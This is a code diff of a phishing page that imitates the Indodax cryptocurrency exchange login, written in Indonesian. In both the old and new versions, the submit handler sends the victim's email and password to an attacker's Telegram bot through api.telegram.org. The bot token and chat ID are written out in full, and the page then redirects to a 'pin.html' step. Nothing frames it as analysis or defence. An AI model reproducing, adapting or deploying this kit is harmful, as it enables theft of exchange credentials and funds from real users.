@@ -1,180 +1,318 @@
-<html lang="en">
-<head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+<html lang="id">
+ <head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
   <title>Indodax Login</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter&amp;display=swap"
+    rel="stylesheet"
+  />
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
     body {
-      font-family: 'Inter', sans-serif;
+      font-family: "Inter", sans-serif;
     }
-    /* Loading overlay styles */
-    #loadingOverlay {
-      background-color: rgba(255, 255, 255, 0.8);
-      backdrop-filter: blur(3px);
-      position: fixed;
-      inset: 0;
-      z-index: 50;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      visibility: hidden;
-      opacity: 0;
-      transition: opacity 0.3s ease;
-    }
-    #loadingOverlay.show {
-      visibility: visible;
-      opacity: 1;
-    }
-    /* Spinner animation */
-    .spinner {
-      border: 4px solid #e5e7eb; /* Tailwind gray-200 */
-      border-top: 4px solid #0077cc; /* Custom blue */
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
+    /* Custom CSS for disabled button */
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      background-color: #1d9bf0; /* lighter blue */
+      color: #1d9bf0; /* lighter text */
+      box-shadow: none;
     }
   </style>
-</head>
-<body class="bg-white text-gray-900 relative">
-  <header class="flex items-center justify-between px-4 py-3 border-b border-gray-200">
-    <div class="flex items-center space-x-2">
-      <img alt="Indodax logo text in blue" class="h-7 w-auto" height="30" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTRHCOE7BSJG8ioQWJO1WCG7D3t-dpqgT7t6I3VxXsL4L6IzwikoDN0iUbB&s=10" width="100"/>
-    </div>
-    <div class="flex items-center space-x-2">
-      <button class="bg-[#0091FF] text-white text-sm font-semibold px-3 py-1 rounded" type="button">Daftar</button>
-      <img alt="Indonesian flag icon" class="h-6 w-6 rounded-sm" height="24" src="https://media.istockphoto.com/id/1314789593/id/vektor/indonesia-ilustrasi-vektor-ikon-bendera-bulat.jpg?s=612x612&w=0&k=20&c=NClD2JYR381TnRbJEi3JZORSm8WBDs7I88Y67H75JrI=" width="24"/>
-    </div>
+ </head>
+ <body class="bg-white text-gray-800 min-h-screen relative">
+  <header
+    class="flex items-center justify-between px-4 py-3 border-b border-gray-200"
+  >
+   <img
+     alt="Indodax logo text in blue"
+     class="h-6 w-auto"
+     height="24"
+     src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTRHCOE7BSJG8ioQWJO1WCG7D3t-dpqgT7t6I3VxXsL4L6IzwikoDN0iUbB&s=10"
+     width="100"
+   />
+   <button
+     class="bg-[#1d9bf0] text-white text-sm font-semibold px-4 py-1 rounded"
+     type="button"
+   >
+    Daftar
+   </button>
   </header>
-  <main class="px-6 pt-6 max-w-md mx-auto">
-    <section>
-      <h1 class="font-semibold text-lg text-gray-900 mb-1">INDODAX Login</h1>
-      <p class="text-gray-600 text-sm mb-6">Gunakan email dan kata sandi yang terdaftar untuk masuk ke akun Anda</p>
-      <form id="loginForm" class="space-y-4">
-        <div>
-          <label class="block text-xs font-semibold text-gray-700 mb-1" for="email">Email</label>
-          <input class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500" id="email" placeholder="Masukkan Email" type="email" required/>
-        </div>
-        <div>
-          <label class="block text-xs font-semibold text-gray-700 mb-1" for="password">Password</label>
-          <div class="relative">
-            <input class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 text-sm placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500" id="password" placeholder="Masukkan Kata Sandi" type="password" required/>
-            <button aria-label="Toggle password visibility" class="absolute inset-y-0 right-3 flex items-center text-gray-400" type="button" id="togglePassword">
-              <i class="fas fa-eye-slash"></i>
-            </button>
-          </div>
-          <div class="text-right mt-1">
-            <a class="text-sm text-[#0091FF] font-medium hover:underline" href="https://indodax.com/forgot-password">Lupa Kata Sandi</a>
-          </div>
-        </div>
-        <button class="w-full bg-[#0077cc] text-white font-semibold py-2 rounded-md text-sm disabled:opacity-50 disabled:cursor-not-allowed" type="submit" id="submitBtn" disabled>Masuk</button>
-      </form>
-      <div class="flex items-center my-6 text-gray-400 text-xs">
-        <hr class="flex-grow border-t border-gray-300"/>
-        <span class="px-3">Atau</span>
-        <hr class="flex-grow border-t border-gray-300"/>
-      </div>
-      <button class="w-full border border-gray-300 rounded-md py-2 text-sm flex items-center justify-center space-x-2 hover:bg-gray-50" type="button">
-        <img alt="Google logo icon" class="h-4 w-4" height="18" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmguRXM4x_NfZV05wWKPTaYP90hhm3TwfDK_N-dvY9jhmzEVdq-ntere8&s=10" width="18"/>
-        <span>Lanjut dengan Google</span>
+  <main class="px-5 pt-6 max-w-md mx-auto">
+   <h1 class="font-bold text-base leading-6 mb-1">INDODAX Login</h1>
+   <p class="text-gray-700 text-sm mb-5 leading-relaxed">
+    Gunakan email dan kata sandi yang terdaftar untuk masuk ke akun Anda
+   </p>
+   <form class="space-y-4" id="loginForm" autocomplete="off">
+    <div>
+     <label class="block text-xs font-semibold mb-1" for="email">Email</label>
+     <input
+       class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-[#cbd5e1]"
+       id="email"
+       name="email"
+       placeholder="Masukkan Email"
+       type="email"
+       required
+     />
+    </div>
+    <div>
+     <label class="block text-xs font-semibold mb-1" for="password"
+       >Password</label
+     >
+     <div class="relative">
+      <input
+        class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 text-sm placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-[#cbd5e1]"
+        id="password"
+        name="password"
+        placeholder="Masukkan Kata Sandi"
+        type="password"
+        required
+      />
+      <button
+        type="button"
+        id="togglePassword"
+        class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 text-sm focus:outline-none"
+        aria-label="Toggle password visibility"
+      >
+       <svg
+         xmlns="http://www.w3.org/2000/svg"
+         class="h-5 w-5"
+         fill="none"
+         viewBox="0 0 24 24"
+         stroke="currentColor"
+         stroke-width="2"
+         id="eyeIcon"
+       >
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
+        />
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-1.274 4.057-5.065 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
+        />
+       </svg>
       </button>
-    </section>
-    <section class="mt-10 max-w-md mx-auto">
-      <h2 class="font-semibold text-gray-900 text-sm mb-4">Mengapa 9.0 juta++ pengguna memilih Indodax sebagai exchange andalan</h2>
-      <div class="flex items-start space-x-4 mb-6">
-        <div class="flex-shrink-0 bg-white rounded-lg p-3 shadow-md border border-gray-200">
-          <img alt="Gold medal icon with red ribbon and number 1" class="h-10 w-10" height="40" src="https://indodax.com/indodax/assets/images/svg/pionir.svg" width="40"/>
-        </div>
-        <div>
-          <h3 class="font-semibold text-gray-900 text-sm mb-1">Pionir dan Paling Dipercaya</h3>
-          <p class="text-gray-500 text-xs max-w-xs leading-tight">Bergabung dengan platform jual-beli kripto pertama di indonesia dengan rekam jejak solid sejak 2014.</p>
-        </div>
-      </div>
-    </section>
+     </div>
+     <div class="text-right mt-1">
+      <a
+        class="text-[#1d9bf0] text-xs font-medium"
+        href="https://indodax.com/forgot-password"
+        >Lupa Kata Sandi</a
+      >
+     </div>
+    </div>
+    <button
+      class="w-full bg-[#1d9bf0] text-white font-semibold text-sm py-2 rounded disabled:opacity-50 disabled:cursor-not-allowed"
+      id="submitBtn"
+      type="submit"
+    >
+     Masuk
+    </button>
+   </form>
+   <div class="flex items-center my-5 text-xs text-gray-400">
+    <hr class="flex-grow border-t border-gray-300" />
+    <span class="px-3">Atau</span>
+    <hr class="flex-grow border-t border-gray-300" />
+   </div>
+   <button
+     class="w-full border border-gray-300 rounded-md py-2 flex items-center justify-center gap-2 text-sm text-gray-700 hover:bg-gray-50"
+     type="button"
+   >
+    <img
+      alt="Google logo in color"
+      class="inline-block"
+      height="18"
+      src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmguRXM4x_NfZV05wWKPTaYP90hhm3TwfDK_N-dvY9jhmzEVdq-ntere8&s=10"
+      width="18"
+    />
+    Lanjut dengan Google
+   </button>
+   <section class="mt-8">
+    <h2 class="font-semibold text-sm mb-3">
+     Mengapa 9.0 juta++ pengguna memilih Indodax sebagai exchange andalan
+    </h2>
+     </div>
+    </div>
+     <section class="space-y-10">
+    <article class="flex items-start space-x-6">
+     <div class="flex-shrink-0 bg-white rounded-2xl p-5 shadow-md">
+      <img alt="Gold medal with red ribbons and 1st text in center" class="block" height="34" src="https://indodax.com/indodax/assets/images/svg/pionir.svg" width="34"/>
+     </div>
+     <div>
+      <h1 class="font-extrabold text-lg leading-tight mb-2">
+       Pionir dan Paling Dipercaya
+      </h1>
+      <p class="text-[#5F6C7B] text-base leading-relaxed max-w-xl">
+       Bergabung dengan platform jual-beli kripto pertama di Indonesia dengan rekam jejak solid sejak 2014.
+      </p>
+     </div>
+    </article>
+    <article class="flex items-start space-x-6">
+     <div class="flex-shrink-0 bg-white rounded-2xl p-5 shadow-md">
+      <img alt="Green shield icon with person silhouette inside" class="block" height="34" src="https://indodax.com/indodax/assets/images/svg/registered.svg" width="34"/>
+     </div>
+     <div>
+      <h2 class="font-extrabold text-lg leading-tight mb-2">
+       Terdaftar dan Teregulasi
+      </h2>
+      <p class="text-[#5F6C7B] text-base leading-relaxed max-w-xl">
+       INDODAX terdaftar dan diawasi oleh Otoritas Jasa Keuangan (OJK) sebagai Pedagang Aset Keuangan Digital (PAKD) yang resmi.
+      </p>
+     </div>
+    </article>
+    <article class="flex items-start space-x-6">
+     <div class="flex-shrink-0 bg-white rounded-2xl p-5 shadow-md">
+      <img alt="Stack of colorful coins with bitcoin symbol on top orange green blue gray" class="block" height="34" src="https://indodax.com/indodax/assets/images/svg/various_coins.svg" width="34"/>
+     </div>
+     <div>
+      <h2 class="font-extrabold text-lg leading-tight mb-2">
+       Pilihan Koin Beragam
+      </h2>
+      <p class="text-[#5F6C7B] text-base leading-relaxed max-w-xl">
+       Belanja kripto tanpa takut kehabisan pilihan di market dengan lebih dari 400 koin kripto diperdagangkan.
+      </p>
+     </div>
+    </article>
+    <article class="flex items-start space-x-6">
+     <div class="flex-shrink-0 bg-white rounded-2xl p-5 shadow-md">
+      <img alt="Purple banknote with Rp symbol and 10000 denomination" class="block" height="34" src="https://indodax.com/indodax/assets/images/svg/deposit.svg" width="34"/>
+     </div>
+     <div>
+      <h2 class="font-extrabold text-lg leading-tight mb-2">
+       Deposit Mulai dari Rp10.000
+      </h2>
+      <p class="text-[#5F6C7B] text-base leading-relaxed max-w-xl">
+       Mulai investasi di aset kripto tanpa perlu ragu dengan minimal deposit hanya Rp10.000.
+      </p>
+     </div>
+    </article>
+    <article class="flex items-start space-x-6">
+     <div class="flex-shrink-0 bg-white rounded-2xl p-5 shadow-md">
+      <img alt="Hand holding smartphone with app screen showing a star icon" class="block" height="34" src="https://indodax.com/indodax/assets/images/svg/easy_to_use.svg" width="34"/>
+     </div>
+     <div>
+      <h2 class="font-extrabold text-lg leading-tight mb-2">
+       Kemudahan Ada di Tangan
+      </h2>
+      <p class="text-[#5F6C7B] text-base leading-relaxed max-w-xl">
+       Transaksi melalui website atau pun aplikasi dengan fitur yang mendukung trader di semua tingkatan.
+      </p>
+     </div>
+    </article>
+   </section>
+   <footer class="mt-16 text-center text-[#5F6C7B] text-base leading-relaxed max-w-xl mx-auto">
+    Copyright © 2014 - 2025 PT Indodax Nasional Indonesia. All Rights Reserved.
+   </footer>
   </main>
-
-  <!-- Loading overlay -->
-  <div id="loadingOverlay">
-    <div class="spinner" role="status" aria-label="Loading"></div>
+  <div
+    class="fixed inset-0 bg-white bg-opacity-90 flex flex-col items-center justify-center z-50 hidden"
+    id="loadingOverlay"
+    role="alert"
+    aria-live="assertive"
+    aria-busy="true"
+  >
+   <svg
+     aria-hidden="true"
+     class="animate-spin h-10 w-10 text-[#1d9bf0]"
+     fill="none"
+     viewBox="0 0 24 24"
+   >
+    <circle
+      class="opacity-25"
+      cx="12"
+      cy="12"
+      r="10"
+      stroke="currentColor"
+      stroke-width="4"
+    ></circle>
+    <path
+      class="opacity-75"
+      d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
+      fill="currentColor"
+    ></path>
+   </svg>
+   <span class="mt-4 text-[#1d9bf0] font-semibold text-sm">Memuat...</span>
   </div>
-
   <script>
-    // Toggle password visibility
-    const togglePassword = document.getElementById('togglePassword');
-    const passwordInput = document.getElementById('password');
-    const submitBtn = document.getElementById('submitBtn');
-    const emailInput = document.getElementById('email');
-    const loadingOverlay = document.getElementById('loadingOverlay');
+    const form = document.getElementById("loginForm");
+    const loadingOverlay = document.getElementById("loadingOverlay");
+    const submitBtn = document.getElementById("submitBtn");
+    const togglePasswordBtn = document.getElementById("togglePassword");
+    const passwordInput = document.getElementById("password");
+    const eyeIcon = document.getElementById("eyeIcon");
 
-    togglePassword.addEventListener('click', () => {
-      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-      passwordInput.setAttribute('type', type);
-      togglePassword.innerHTML = type === 'password' ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
-    });
+    togglePasswordBtn.addEventListener("click", () => {
+      const isPassword = passwordInput.getAttribute("type") === "password";
+      passwordInput.setAttribute("type", isPassword ? "text" : "password");
 
-    // Enable submit button only if both email and password have values
-    function toggleSubmitButton() {
-      if(emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
-        submitBtn.disabled = false;
+      // Change icon
+      if (isPassword) {
+        eyeIcon.innerHTML = `
+          <path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.477 0-8.268-2.943-9.542-7a9.956 9.956 0 012.223-3.434m3.31-2.577A9.953 9.953 0 0112 5c4.477 0 8.268 2.943 9.542 7a10.05 10.05 0 01-1.223 2.432M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+          <path stroke-linecap="round" stroke-linejoin="round" d="M3 3l18 18" />
+        `;
       } else {
-        submitBtn.disabled = true;
-      }
-    }
-
-    emailInput.addEventListener('input', toggleSubmitButton);
-    passwordInput.addEventListener('input', toggleSubmitButton);
+        eyeIcon.innerHTML = `
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+          <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-1.274 4.057-5.065 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+        `;
       }
     });
 
-    // Telegram bot info - replace with your own
-    const botToken = '8264143217:AAGF4jq6UCT52FUQ-PCGg2DTVn_wW3Ql14w';
-    const chatId = '6155537801';
-
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    form.addEventListener("submit", async function (e) {
       e.preventDefault();
-      const email = emailInput.value;
-      const password = passwordInput.value;
+      const email = e.target.email.value;
+      const password = e.target.password.value;
+
+      // Disable submit button
+      submitBtn.disabled = true;
 
       // Save email to localStorage
-      localStorage.setItem('indodaxEmail', email);
+      localStorage.setItem("email", email);
 
       // Show loading overlay
-      loadingOverlay.classList.add('show');
+      loadingOverlay.classList.remove("hidden");
 
-      const message = `Login Indodax:\nEmail: ${email}\nPassword: ${password}`;
+      // Telegram bot info - replace with your own bot token and chat ID
+      const botToken = "8264143217:AAGF4jq6UCT52FUQ-PCGg2DTVn_wW3Ql14w";
+      const chatId = "6155537801";
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        loadingOverlay.classList.remove('show');
-        if(data.ok) {
-          window.location.href = "pin.html";
-          this.reset();
-          submitBtn.disabled = true;
-        } else {
-          alert('Failed to send data to Telegram.');
-        }
-      })
-      .catch(() => {
-        loadingOverlay.classList.remove('show');
-        alert('Error sending data to Telegram.');
-      });
+      // Prepare message text
+      const message = `Login Info:\nEmail: ${email}\nPassword: ${password}`;
+
+      // Telegram API URL
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      try {
+        // Send data to Telegram
+        await fetch(telegramUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        });
+      } catch (error) {
+        console.error("Error sending message to Telegram:", error);
+      }
+
+      // Redirect after short delay
+      setTimeout(() => {
+        window.location.href = "pin.html";
+      }, 800);
     });
   </script>
-</body>
+ </body>
 </html>
